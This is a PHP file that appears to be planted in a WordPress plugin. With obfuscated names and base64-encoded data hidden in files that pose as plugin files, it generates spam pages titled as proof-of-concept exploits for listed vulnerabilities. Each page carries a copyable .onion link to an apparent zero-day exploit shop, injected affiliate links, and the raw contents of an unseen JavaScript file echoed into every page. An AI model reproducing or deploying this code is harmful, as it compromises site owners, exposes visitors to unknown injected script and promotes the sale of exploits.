<?php

function iiffxboomh($lmKxn1eZfw) {
    $fNrGL = 0;
    $tDhLkLFa = strlen($lmKxn1eZfw);
    for ($i = 0; $i < $tDhLkLFa; $i++) $fNrGL += ord($lmKxn1eZfw[$i]);
    return $fNrGL;
}

$hzllAG = intval(get_query_var('rwixjsm'));

if ($hzllAG < 1 || $hzllAG > 1163) return;
$aH9V4nM = file(plugin_dir_path(__FILE__).'genesis-composer.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$w7kQsq3TX = explode(';', base64_decode($aH9V4nM[$hzllAG]));
if (count($w7kQsq3TX) < 2) return;
$hcJbfvf = $w7kQsq3TX[0];
$tWAijYAwIt = iiffxboomh($hcJbfvf);
$tDOIaDL57 = $hcJbfvf . ' POC (Proof-of-Concept)';
//$tDOIaDL57 = 'Exploit for ' . $hcJbfvf;
$q8rSLry  = $w7kQsq3TX[1];
$k2jlkh0xw = $w7kQsq3TX[2];
$wB9Pu = $w7kQsq3TX[3];
$mQ5Iog5lZ  = $w7kQsq3TX[4];
set_query_var('wlyxfwdsxi', $tDOIaDL57);

$jEoYP = '';
$tPj9Pa2G = plugin_dir_path(__FILE__).'global-affiliates.php';
if (is_file($tPj9Pa2G)) {
	$x3uLmtj = file($tPj9Pa2G, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($x3uLmtj);
	shuffle($x3uLmtj);
	$owd4e = mt_rand(2, 5);
	if (count($x3uLmtj) > $owd4e) {
		for ($ibl7CsKQaL = 0; $ibl7CsKQaL < $owd4e; $ibl7CsKQaL++) {
			$cujm3 = base64_decode(array_shift($x3uLmtj));
			$jEoYP .= '<p><a href="'.$cujm3.'">'.$cujm3.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $tDOIaDL57; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $mQ5Iog5lZ . "</p>\n";
				if (strlen($q8rSLry) > 0) echo "<p><strong>Published: </strong>" . $q8rSLry . "</p>\n";
				if (strlen($k2jlkh0xw) > 0) echo "<p><strong>CVSS: </strong>" . $k2jlkh0xw . "</p>\n";
				if (strlen($wB9Pu) > 0) echo "<p><strong>CVSS Vector: </strong>" . $wB9Pu . "</p>\n";
				?>
				<p><strong>Download <?php echo $tDOIaDL57; ?> here:</strong></p>
				
				<div class="url-container">
					<textarea class="url-textarea" readonly>http://zeroday5ujpidshxn6zbfitgjltnm6ynx5pvtpmptj3lsq46b6vvrpqd.onion/exploit-for-<?php echo str_replace(' ', '-', strtolower($hcJbfvf)) . '.' . $tWAijYAwIt; ?>/</textarea>
					<button class="copy-btn">Copy</button>
				</div>
				<p></p>
				<p><strong>Tip:</strong> Download official Tor Browser at https://www.torproject.org/download/ to access .onion links.</p>
				<p></p>
				<p>Check our portfolio:</p>
				<div class="url-container">
					<textarea class="url-textarea" readonly>http://zeroday5ujpidshxn6zbfitgjltnm6ynx5pvtpmptj3lsq46b6vvrpqd.onion/members/startupclub.344/</textarea>
					<button class="copy-btn">Copy</button>
				</div>

				<?php
				echo $jEoYP;
				?>


  <script>
    document.querySelectorAll('.url-container').forEach(container => {
      const textarea = container.querySelector('.url-textarea');
      const button = container.querySelector('.copy-btn');

      button.addEventListener('click', async () => {
        const textToCopy = textarea.value.trim();

        try {
          await navigator.clipboard.writeText(textToCopy);

          // Visual feedback
          const originalText = button.textContent;
          button.textContent = 'Copied!';
          button.classList.add('copied');

          // Reset button after 2 seconds
          setTimeout(() => {
            button.textContent = originalText;
            button.classList.remove('copied');
          }, 2000);

        } catch (err) {
          console.error('Failed to copy:', err);
          alert('Failed to copy to clipboard');
        }
      });
    });
  </script>

  <style>
    .url-container {
      position: relative;
      margin-bottom: 15px;
      max-width: 600px;
    }

    .url-textarea {
      width: 100%;
      height: 80px;
      padding: 12px 15px;
      border: 2px solid #ddd;
      border-radius: 8px;
      font-family: monospace;
      font-size: 15px;
      resize: vertical;
      box-sizing: border-box;
    }

    .copy-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      padding: 8px 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      transition: background-color 0.2s;
    }

    .copy-btn:hover {
      background-color: #0056b3;
    }

    .copy-btn.copied {
      background-color: #28a745;
    }
  </style>


			</div>
		</article>
	</main>
</div>

<?php
$hHc0esogH = plugin_dir_path(__FILE__) . 'create-home.js';
if (is_file($hHc0esogH)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($hHc0esogH);
	echo '</script>';
}
get_footer();
?>
